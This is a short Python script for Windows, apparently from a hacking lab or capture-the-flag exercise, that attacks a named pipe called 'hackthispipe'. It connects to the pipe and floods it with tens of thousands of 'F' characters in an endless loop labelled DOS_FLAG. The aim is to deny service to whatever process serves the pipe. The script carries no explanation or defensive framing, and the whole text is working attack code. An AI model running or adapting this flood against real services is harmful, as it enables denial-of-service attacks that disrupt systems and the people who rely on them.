
import win32file
PIPE_NAME = r'\\.\pipe\hackthispipe'                   
def main():
    while True:
        try:
        # Connect to the named pipe
            pipe_handle = win32file.CreateFile(
                PIPE_NAME,
                win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                0,
                None,
                win32file.OPEN_EXISTING,
                0,
                None
            )
            print("Connected to pipe")
            #print(credentials)
            while True:
                DOS_FLAG = "FFFFFFF"*9999
                win32file.WriteFile(pipe_handle,DOS_FLAG.encode('utf-8'))
        except Exception as e:
            print("Denying pipe -> Causing error:", e)
if __name__ == "__main__":
    main()


